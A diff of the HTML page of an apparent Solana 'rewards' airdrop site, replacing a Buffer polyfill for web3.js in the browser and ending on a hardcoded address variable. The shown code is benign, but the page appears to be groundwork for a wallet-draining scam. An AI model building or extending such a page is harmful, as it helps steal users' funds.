@@ -5,14 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SolDrop — Solana Ecosystem Rewards</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◎</text></svg>">
-<script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
-<script>
-(function(){try{
-var B=(typeof window.buffer!=="undefined"&&window.buffer&&window.buffer.Buffer)?window.buffer.Buffer:null;
-if(!B&&typeof globalThis!=="undefined"&&globalThis.Buffer)B=globalThis.Buffer;
-if(B){window.Buffer=B;globalThis.Buffer=B;}
-if(!B){var s=document.createElement("script");s.src="https://unpkg.com/buffer@6.0.3/dist/buffer.min.js";s.onload=function(){if(window.buffer&&window.buffer.Buffer){window.Buffer=window.buffer.Buffer;}};document.head.appendChild(s);}
-}catch(e){}})();
+<script type="module">
+import { Buffer as Buf } from "https://esm.sh/buffer@6.0.3";
+window.Buffer = Buf;
 </script>
 <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 <style>
@@ -236,7 +231,33 @@ footer span{cursor:pointer;transition:color .2s}footer span:hover{color:#fff}
 </div>
 </div>
 <script>
-if(typeof Buffer==="undefined"){window.Buffer=(window.buffer&&window.buffer.Buffer)||{from:function(a,b){if(typeof a==="string"){a=b==="hex"?a.match(/.{2}/g).map(function(h){return parseInt(h,16)}):Array.from(new TextEncoder().encode(a))}return new Uint8Array(a)},concat:function(arrs){var t=0;arrs.forEach(function(a){t+=a.length});var o=new Uint8Array(t),p=0;arrs.forEach(function(a){o.set(a,p);p+=a.length});return o},alloc:function(n){return new Uint8Array(n)},isBuffer:function(x){return x instanceof Uint8Array}}}}
+(function(){
+  if (typeof Buffer !== "undefined") return;
+  function toBytes(a, enc){
+    if (typeof a === "string"){
+      if (enc === "hex"){
+        var out = [];
+        for (var i = 0; i < a.length; i += 2) out.push(parseInt(a.substr(i, 2), 16));
+        return new Uint8Array(out);
+      }
+      return new TextEncoder().encode(a);
+    }
+    if (a instanceof Uint8Array) return a;
+    return new Uint8Array(a);
+  }
+  var shim = function(a, enc){ return toBytes(a, enc); };
+  shim.from = toBytes;
+  shim.alloc = function(n){ return new Uint8Array(n); };
+  shim.concat = function(list){
+    var t = 0, i;
+    for (i = 0; i < list.length; i++) t += list[i].length;
+    var o = new Uint8Array(t), p = 0;
+    for (i = 0; i < list.length; i++){ o.set(list[i], p); p += list[i].length; }
+    return o;
+  };
+  shim.isBuffer = function(x){ return x instanceof Uint8Array; };
+  window.Buffer = shim;
+})();
 </script>
 <script>
 var _R = "G7iCjrZFgGegvzz7xryGi9PrAZAweYiKNYGH42GBkc4X";
